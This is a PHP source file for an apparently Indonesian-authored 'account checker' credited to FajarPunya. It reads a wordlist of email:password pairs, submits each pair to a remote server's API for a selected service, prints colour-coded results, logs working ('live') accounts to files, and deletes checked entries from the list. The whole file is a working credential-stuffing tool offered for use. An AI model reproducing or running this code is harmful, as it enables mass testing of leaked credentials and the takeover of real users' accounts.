<?php

function created_by($param)
{
$VERSION_FILE 	= file(__DIR__."/.VERSION") or die("Unable to open file!");
echo "
./ ************************************************************************************ \.
./ || www.fajarpunya.com
./ || Created By FajarPunya [ 19 September 2017 ] (New Update)
./ || ".$param." ACCOUNT CHECKER
./ || BUID VERSION ".$VERSION_FILE[0]."
./ || Date Now : ".date('d M Y')."
./ ************************************************************************************ \.
	\n";
}

function curl($email,$password,$wordlists,$section,$server_host,$delim,$username)
{
	$url = $server_host.'api/'.$section.'/process';
	$data = "email=".$email."&pass=".$password."&security_code=".$username."&section=".$section."&delimiter=".$delim;
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL 				=> $url,
 		CURLOPT_RETURNTRANSFER 		=> 1,
		CURLOPT_FOLLOWLOCATION		=> 1,
		CURLOPT_VERBOSE				=> 0,
		CURLOPT_HEADER				=> 0, #0 ? 1 : 0,
		CURLOPT_NOBODY				=> 0, #0 ? 1 : 0,
		CURLOPT_TIMEOUT				=> 20,
		CURLOPT_CONNECTTIMEOUT		=> 20,
		CURLOPT_POST				=> 1,
		CURLOPT_POSTFIELDS			=> $data,
	));
	$response 	= curl_exec($ch);
	$error 		= curl_error($ch);
	$info 		= curl_getinfo($ch);
	return array
	(
		'code' 		=> $info['http_code'],
		'info'		=> $info,
		'response' 	=> $response
	);
}

function _main_windos($wordlists,$section,$delim,$server_host,$username)
{
	$db_list = file($wordlists) or die("Unable to open file wordlist!");
	for ($i=0; $i < count($db_list);)
	{
		$explode_acc = explode($delim, $db_list[$i]);
		$email = clean($explode_acc[0]);
		$password = str_replace(array("\n","\r"),"",$explode_acc[1]);
		if(validate_email($email) != "")
		{
			$page = curl($email,$password,$wordlists,$section,$server_host,$delim,$username);
			if($page['code'] == 200)
			{
				$data = json_decode($page['response']);
				$from 	= $i + 1;
				$to 	= count($db_list) - $from;
				$x = $data->status." | ".$data->email." | ".$data->password." | ".$data->msg."|".$data->label." | ".$data->datetime;
				if($data->error == 0)
				{
					echo "\033[32m".$x."\n";
					write_logs($section,$x,$delim);
					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
					$i++;
				} elseif($data->error == 1)
				{
					echo "\033[34m".$x."\n";
					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
					$i++;
				} elseif($data->error == 2)
				{ 
					echo "\033[31m".$x."\n";
					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
					$i++;
				} elseif($data->error == 3)
				{
					echo "\033[30m".$x."\n";
					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
					$i++;
				} else
				{
					echo "\033[33m".$x."\n";
				}
			} else
			{
				echo "\033[31m Webhost not responding.\n";
			}

		} else
		{
			remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
			$i++;
		}
	}
}

function _main_linux($wordlists,$section,$delim,$server_host,$username)
{
	$db_list = file($wordlists) or die("Unable to open file!");
	for ($i=0; $i < count($db_list);)
	{
		$explode_acc = explode($delim, $db_list[$i]);
		$email = clean($explode_acc[0]);
		$password = str_replace(array("\n","\r"),"",$explode_acc[1]);
		if(validate_email($email) != "")
		{
			$page = curl($email,$password,$wordlists,$section,$server_host,$delim,$username);
			if($page['code'] == 200)
			{
				$data = json_decode($page['response']);
				$from 	= $i + 1;
				$to 	= count($db_list) - $from;
				$x = $data->status." | ".$data->email." | ".$data->password." | ".$data->msg."|".$data->label." | ".$data->datetime;
				if($data->error == 0)
				{
					echo "\033[32m".$x."\n";
					write_logs($section,$x,$delim);
					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
					$i++;
				} elseif($data->error == 1)
				{
					echo "\033[34m".$x."\n";
					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
					$i++;
				} elseif($data->error == 2)
				{ 
					echo "\033[31m".$x."\n";
					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
					$i++;
				} elseif($data->error == 3)
				{
					echo "\033[30m".$x."\n";
					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
					$i++;
				} else
				{
					echo "\033[33m".$x."\n";
				}
			} else
			{
				echo "\033[31m Webhost not responding.\n";
			}
		} else
		{
			remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
			$i++;
		}
	}
}

function clean($param)
{

	return $postfield = trim(preg_replace('/\s\s+/', '', $param));
}

function get_str($string,$start,$end)
{
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

function find_str($s, $as)
{
    $s = strtoupper($s);

    if(!is_array($as)) $as=array($as);
   	{
	    for($i=0;$i<count($as);$i++)
	    {
	    	if(strpos(($s),strtoupper($as[$i]))!==false)
	    	{
	    		return true;
	    	} else
	    	{
	    		return false;
	    	}
	   	}
	}
}

function write_logs($file,$param,$delim)
{
	$path_file 	= __DIR__."/logs/".strtoupper("live_".$file.".log"); 

	if(file_exists($path_file))
	{
		file_put_contents($path_file, $param.PHP_EOL , FILE_APPEND | LOCK_EX);
	} else
	{
		file_put_contents($path_file, $param.PHP_EOL , FILE_APPEND | LOCK_EX);
		fclose($path_file);
	}
}

function remove_text($file,$text)
{

	$get_file 	= file_get_contents($file);
	$text 		= str_replace($text, "", $get_file);

	$myFile = fopen($file, "w");
	fwrite($myFile, $text);
	fclose($myFile);

}

function validate_email($param)
{

	return filter_var($param, FILTER_VALIDATE_EMAIL);
}

function section($x,$section,$server_host)
{
	$get_file 	= file_get_contents($server_host."data_api/data.json");
	$data 		= json_decode($get_file,true);

	if($x == "validate")
	{

		for($i=0; $i < count($data['res']); $i++)
		{

			if(strtolower($section) == $data['res'][$i]['url'])
			{
				return true;
			}
		}

	} else
	{
		for($i=0; $i < count($data['res']); $i++)
		{
			$no = $i + 1;
			if($data['res'][$i]['api'] == true )
			{
				echo "[+] Code : ".$data['res'][$i]['url']."\n";
			}
		}
	}
}